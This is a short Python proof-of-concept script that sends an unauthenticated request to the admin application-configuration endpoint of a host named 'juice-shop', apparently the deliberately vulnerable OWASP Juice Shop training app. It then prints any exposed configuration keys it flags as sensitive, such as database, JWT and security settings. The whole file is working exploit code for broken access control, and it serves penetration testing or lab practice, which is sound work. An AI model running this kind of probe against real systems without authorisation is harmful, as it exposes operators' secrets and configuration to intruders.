import httpx
import json

# Target URL for the vulnerable endpoint
url = "http://juice-shop:3000/rest/admin/application-configuration"

try:
    # Make request without authentication
    response = httpx.get(url)

    print(f"Status Code: {response.status_code}")

    if response.status_code == 200:
        try:
            data = response.json()
            print("SUCCESS: Application configuration data exposed without authentication!")
            print(f"Full response keys: {list(data.keys())}")

            # Look for sensitive configuration data
            if 'config' in data:
                config_data = data['config']
                print(f"Configuration object keys: {list(config_data.keys()) if isinstance(config_data, dict) else 'Not a dict'}")

                # Check for particularly sensitive sub-keys
                sensitive_keys = ['database', 'security', 'jwt', 'server', 'port', 'host']
                found_sensitive = []
                if isinstance(config_data, dict):
                    for key in sensitive_keys:
                        if key in config_data:
                            found_sensitive.append(key)
                            print(f"SENSITIVE DATA EXPOSED - {key}: {config_data[key]}")

                if found_sensitive:
                    print(f"Vulnerability confirmed! Sensitive configuration keys exposed: {found_sensitive}")
                else:
                    print("Configuration data present but checking specific sensitive fields...")
                    # Print first few items to see what's there
                    if isinstance(config_data, dict):
                        items = list(config_data.items())[:5]
                        for k, v in items:
                            print(f"{k}: {v}")
            else:
                print("Response structure:")
                print(json.dumps(data, indent=2)[:1000])

        except Exception as json_err:
            print(f"JSON parsing error: {json_err}")
            print("Raw response (first 1000 chars):")
            print(response.text[:1000])
    else:
        print(f"Request failed with status: {response.status_code}")
        print("Response headers:", dict(response.headers))
        if response.text:
            print("Response preview:", response.text[:500])

except Exception as e:
    print(f"Error making request: {e}")

